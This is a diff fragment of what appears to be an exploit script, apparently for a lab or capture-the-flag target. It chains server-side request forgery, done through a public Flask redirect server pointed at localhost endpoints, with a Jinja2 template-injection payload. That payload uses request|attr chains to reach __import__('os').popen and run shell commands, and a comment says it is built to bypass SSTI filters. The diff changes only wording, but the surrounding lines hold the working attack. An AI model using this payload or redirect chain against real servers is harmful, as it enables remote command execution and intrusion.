@@ -22,7 +22,7 @@ Step 2: On the publicly accessible server, write the following script and call i
         password="Johnwick3$"
         return redirect(f'http://127.0.0.1:3000/register?username={username}&password={password}')
 
-Step 3: On the public server run the hosted app.py:  flask run --host=0.0.0.0
+Step 3: On the public server run app.py:  flask run --host=0.0.0.0
 Step 4: Run the script below
 """  
 
@@ -75,5 +75,5 @@ ssrf_ssti()
 #      token="cbce407b81b2897f3242f1dc1363f52d" # Change the token value
 #      directory="{% print(request|attr('application')|attr(request|attr('args')|attr('get')('g'))|attr(request|attr('args')|attr('get')('gi'))(request|attr('args')|attr('get')('b'))|attr(request|attr('args')|attr('get')('gi'))(request|attr('args')|attr('get')('i'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()) %}&g=__globals__&b=__builtins__&i=__import__&gi=__getitem__&cmd=ls+/"  # This format is needed to bypass ssti filters
 #       return redirect(f'http://127.0.0.1:3000/home?directory={directory}&token={token}') 
-# Step 6: On the public server run the hosted app.py:  flask run --host=0.0.0.0
+# Step 6: On the public server run app.py:  flask run --host=0.0.0.0
 # Step 7: Run the 'ssrf_ssti' function again
